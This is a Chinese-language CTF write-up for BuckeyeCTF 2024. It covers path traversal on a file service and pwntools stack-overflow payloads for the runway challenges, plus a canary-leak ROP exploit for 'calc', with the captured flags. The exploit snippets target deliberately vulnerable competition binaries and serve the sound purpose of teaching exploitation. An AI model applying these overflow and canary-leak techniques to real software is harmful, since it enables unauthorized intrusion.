---
title: Buckeye CTF · 2024 WriteUp (狼组版)
contest: BuckeyeCTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [pwnoh.io, uuid文件存储, 目录穿越flag.txt, runway0/1/2栈溢出, calc canary leak, color regex回显, L33t, 30+题多方向]
attack_chain:
  - Web fu: SSFS 文件服务, uuid 存储, 目录穿越读 flag.txt → bctf{4lw4y5_35c4p3_ur_p4th5}
  - Pwn runway0: sh 一行 exec 1>&2 + cat flag.txt
  - Pwn runway1: 0x4c padding + p32(win) 覆盖返回
  - Pwn color: 字符串回显, 输入含 "ctf{1_d0n7_c4r3_571ll_4_m1d_c010r}!?!?"
  - Pwn runway2: 0x14 * 0x09 + p32(0x804A025+0x1fdb) + 'aaaa' + p32(0x8049253)
  - Pwn calc: input 'pi' + '10014' 触发 canary 泄 + 0x28 + canary + rbp + ret
  - 多 flag: 0v3rfl0w_the_M00n0ry, I_34t_fl4GS, 1_d0n7_c4r3_571ll_4_m1d_c010r, I_m1sS_4r1thm3t1c_qu1ZZ3s
key_payload: 'uuid 文件存储 / 目录穿越 flag.txt / 0x4c padding + p32(win) / 0x14*0x09 + p32(0x804A025+0x1fdb) + p32(0x8049253) / canary 泄 + 0x28 + canary + rbp + ret'
one_liner: BuckeyeCTF 2024 狼组复盘 — Web SSFS uuid 目录穿越 + Pwn runway0/1/2 栈溢出 + calc canary 泄 + color 字符串回显 + 4 个 flag 涵盖 web/pwn/reverse。
lesson: 入门级赛事风格:目录穿越/栈溢出/canary 泄 全覆盖;uuid 文件服务常见目录穿越;calc 类题目 'pi' 触发 canary 泄是经典 trick。
quality: medium
---

# Buckeye CTF · 2024 WriteUp (狼组版)

## 速读
狼组 BuckeyeCTF 2024 复盘 — 多方向入门级赛事。

## Web

### fu
- Master Oogway 风格新闻站点
- 简单注册类

### SSFS
- uuid 存储文件服务
- 目录穿越读 flag.txt
- `bctf{4lw4y5_35c4p3_ur_p4th5}`

## Pwn

### runway0
```bash
sh
exec 1>&2
cat flag.txt
```
- `bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}`

### runway1
```python
pd = b'a' * 0x4c
pd += p32(chall.sym['win'])
p.sendline(pd)
```
- `bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}`

### color
- 输入含 `ctf{1_d0n7_c4r3_571ll_4_m1d_c010r}!?!?`
- `bctf{1_d0n7_c4r3_571ll_4_m1d_c010r}`

### runway2
```python
pd = b'\x09' * 0x14
pd += p32(0x804A025 + 0x1fdb) + b'aaaa'
pd += p32(0x8049253)
```
- `bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}`

### calc
```python
p.sendlineafter(b'first operand: ', b'1')
p.sendlineafter(b'the operator: ', b'+')
p.sendlineafter(b'second operand: ', b'pi')   # 触发 canary 泄
p.sendlineafter(b' like to use: ', b'10014')

canary = u64(p.recvuntil(b'\nResult: ')[:-9][-8:])
pd = b'0' * 0x28
pd += p64(canary) + p64(chall.bss(0x500)) + p64(0x40130D)
```
